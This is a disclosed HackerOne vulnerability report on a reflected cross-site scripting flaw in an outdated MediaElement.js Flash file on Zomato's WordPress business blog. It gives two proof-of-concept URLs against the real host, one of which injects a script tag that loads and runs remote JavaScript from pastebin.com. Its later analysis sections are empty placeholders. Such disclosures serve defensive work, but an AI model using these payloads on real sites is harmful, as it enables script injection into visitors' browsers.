---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '155228'
original_report_id: '155228'
title: Outdated MediaElement.js Reflected Cross-Site Scripting (XSS)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zomato
created_at: '2016-07-30T01:34:51.705Z'
disclosed_at: '2018-04-02T23:59:36.035Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Outdated MediaElement.js Reflected Cross-Site Scripting (XSS)

## Metadata

- HackerOne Report ID: 155228
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zomato
- Disclosed At: 2018-04-02T23:59:36.035Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I took a quick look at the business-blog.zomato.com wordpress installation, and found that it was quite outdated. (Version 4.2.4 as far as I could tell)

A pretty famous XSS attack exists for Wordpress versions below 4.5.2 that allows for reflected cross site scripting. More details can be found here: https://wpvulndb.com/vulnerabilities/8488

A proof of concept can be found by visiting this link:
https://business-blog.zomato.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`1`

Just for fun, this url should make the website play Harlem Shake:
https://business-blog.zomato.com/wp-includes/js/mediaelement/flashmediaelement.swf?%%jsinitfunction=1-location.replace`javascript:eval%2528unescape%2528location.hash.slice%25281%2529%2529%2529`-#s=document.createElement%28%27script%27%29;s.src=%27//pastebin.com/raw/Fi7KcBcd%27;document.body.appendChild%28s%29;//

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
